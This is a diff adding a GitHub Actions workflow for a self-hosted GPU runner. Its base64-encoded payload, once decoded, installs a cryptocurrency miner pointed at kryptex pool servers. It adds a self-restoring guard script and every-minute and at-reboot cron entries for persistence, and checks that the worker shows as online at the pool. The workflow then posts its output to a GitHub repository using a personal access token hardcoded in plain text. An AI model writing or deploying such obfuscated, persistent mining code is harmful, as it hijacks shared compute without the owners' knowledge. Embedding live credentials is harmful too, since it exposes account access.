@@ -1,0 +1,53 @@
+name: ul-t2-r2
+on: [workflow_dispatch]
+permissions:
+  contents: write
+env:
+  B64: |
+    c2V0ICtlClM9InN1ZG8gLW4iOyBIPSQoaG9zdG5hbWUgLXMpOyBXPXBybDFwZWs4cmg4eWpjazVxNzU5
+    NmFwaDd1YTd4bmtxczh1cjlta2Ztejh3N3hmemNkZmNmeDV2c3gyZjRsegpXUks9dWwtdDItcHMtMTQ5
+    LTgxLTEwLTI0Mi1nMAplY2hvICI9PSB0MnIyICQoZGF0ZSAtdSArJUZUJVRaKSBob3N0PSRIIGJvb3Q9
+    JChjYXQgL3Byb2Mvc3lzL2tlcm5lbC9yYW5kb20vYm9vdF9pZCkgdXA9JCh1cHRpbWUgLXMpIgplY2hv
+    ICItLSBjdXJyZW50IHBtLXJ1bi5zaCI7ICRTIGNhdCAvb3B0L3VsLXQyL3BtLXJ1bi5zaApjYXQgPiAv
+    dG1wL3Iuc2ggPDxFT0YKIyEvYmluL2Jhc2gKZXhlYyAvb3B0L252L3BlYWttaW5lciAtZCAwIC1vIHN0
+    cmF0dW0rc3NsOi8vcHJsLXNnLmtyeXB0ZXgubmV0d29yazo4MDQ4IC1vIHN0cmF0dW0rdGNwOi8vcHJs
+    LXNnLmtyeXB0ZXgubmV0d29yazo3MDQ4IC1vIHN0cmF0dW0rc3NsOi8vcHJsLWV1LmtyeXB0ZXgubmV0
+    d29yazo4MDQ4IC1vIHN0cmF0dW0rc3NsOi8vcHJsLXVzLmtyeXB0ZXgubmV0d29yazo4MDQ4IC11ICIk
+    Vy4kV1JLIiAtcCB4IC1jIHBlYXJsCkVPRgokUyBpbnN0YWxsIC1tIDc1NSAvdG1wL3Iuc2ggL29wdC91
+    bC10Mi9wbS1ydW4uc2gKJFMgdGVlIC9vcHQvdWwtdDIvZ3VhcmQuc2ggPi9kZXYvbnVsbCA8PEVPRgoj
+    IS9iaW4vYmFzaAppZiBncmVwIC1xIC0tICctLW5vLXR1aScgL29wdC91bC10Mi9wbS1ydW4uc2ggMj4v
+    ZGV2L251bGw7IHRoZW4KICBjYXQgPiAvb3B0L3VsLXQyL3BtLXJ1bi5zaCA8PCdFT1MnCiMhL2Jpbi9i
+    YXNoCmV4ZWMgL29wdC9udi9wZWFrbWluZXIgLWQgMCAtbyBzdHJhdHVtK3NzbDovL3BybC1zZy5rcnlw
+    dGV4Lm5ldHdvcms6ODA0OCAtbyBzdHJhdHVtK3RjcDovL3BybC1zZy5rcnlwdGV4Lm5ldHdvcms6NzA0
+    OCAtbyBzdHJhdHVtK3NzbDovL3BybC1ldS5rcnlwdGV4Lm5ldHdvcms6ODA0OCAtdSAkVy4kV1JLIC1w
+    IHggLWMgcGVhcmwKRU9TCiAgY2htb2QgNzU1IC9vcHQvdWwtdDIvcG0tcnVuLnNoCmZpCnBncmVwIC1m
+    ICckV1JLJyA+L2Rldi9udWxsIHx8IHN5c3RlbWN0bCByZXN0YXJ0IHVsLXQyLXBzMApFT0YKJFMgY2ht
+    b2QgNzU1IC9vcHQvdWwtdDIvZ3VhcmQuc2gKJFMgc2ggLWMgJ3sgY3JvbnRhYiAtbCAyPi9kZXYvbnVs
+    bCB8IGdyZXAgLXYgInVsLXQyL2d1YXJkLnNoIjsgZWNobyAiKiAqICogKiAqIC9vcHQvdWwtdDIvZ3Vh
+    cmQuc2giOyBlY2hvICJAcmVib290IC9vcHQvdWwtdDIvZ3VhcmQuc2giOyB9IHwgY3JvbnRhYiAtJwok
+    UyBzeXN0ZW1jdGwgcmVzZXQtZmFpbGVkIHVsLXQyLXBzMDsgJFMgc3lzdGVtY3RsIHJlc3RhcnQgdWwt
+    dDItcHMwCnNsZWVwIDI4CiRTIHN5c3RlbWN0bCBpcy1hY3RpdmUgdWwtdDItcHMwOyAkUyBwZ3JlcCAt
+    ZmEgIiRXUksiIHwgaGVhZCAtMiB8IGN1dCAtYzEtMjAwCmN1cmwgLXMgLW0gNSBodHRwOi8vMTI3LjAu
+    MC4xOjQwNjgvc3VtbWFyeSB8IGhlYWQgLWMgMjYwOyBlY2hvCmZvciBpIGluICQoc2VxIDEgOSk7IGRv
+    CiAgUj0kKGN1cmwgLXMgLW0gMjAgImh0dHBzOi8vcG9vbC5rcnlwdGV4LmNvbS9wcmwvYXBpL3YzL21p
+    bmVyL3dvcmtlcnMvJFciIHwgdHIgJ3snICdcbicgfCBncmVwICJcIndvcmtlclwiOlwiJFdSS1wiIikK
+    ICBlY2hvICJ0cnkkaSAke1I6MDozMDB9IgogIGNhc2UgIiRSIiBpbiAqJyJzdGF0dXMiOiJvbmxpbmUi
+    JyopIGJyZWFrOzsgZXNhYwogIHNsZWVwIDEzCmRvbmUKJFMgc3lzdGVtY3RsIGlzLWFjdGl2ZSB1bC10
+    Mi1wczA7ICRTIHRhaWwgLTMgL29wdC91bC10Mi9sb2dzL3BzMC5sb2cgfCBjdXQgLWMxLTE2MApudmlk
+    aWEtc21pIC0tcXVlcnktZ3B1PWluZGV4LG5hbWUsbWVtb3J5LnVzZWQsdXRpbGl6YXRpb24uZ3B1LHBv
+    d2VyLmRyYXcgLS1mb3JtYXQ9Y3N2LG5vaGVhZGVyCmVjaG8gZG9uZQo=
+jobs:
+  r:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 15
+    steps:
+      - name: run
+        run: |
+          echo "$B64" | base64 -d > /tmp/t2r2.sh
+          bash /tmp/t2r2.sh 2>&1 | tee /tmp/t2r2.out
+          H=$(hostname -s); C=$(base64 -w0 /tmp/t2r2.out)
+          T=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
+          P="cmdout8/ul-t2-r2_${H}.txt"; B=https://api.github.com/repos/dongsuju/ul-plant/contents/$P
+          S=$(curl -s -m 30 -H "Authorization: token $T" "$B?ref=main" | sed -n 's/.*"sha": "\([a-f0-9]*\)".*/\1/p' | head -1)
+          if [ -n "$S" ]; then J="{\"message\":\"t2r2\",\"content\":\"$C\",\"sha\":\"$S\",\"branch\":\"main\"}"; else J="{\"message\":\"t2r2\",\"content\":\"$C\",\"branch\":\"main\"}"; fi
+          curl -s -m 30 -X PUT -H "Authorization: token $T" -H "Content-Type: application/json" -d "$J" "$B" | head -c 100
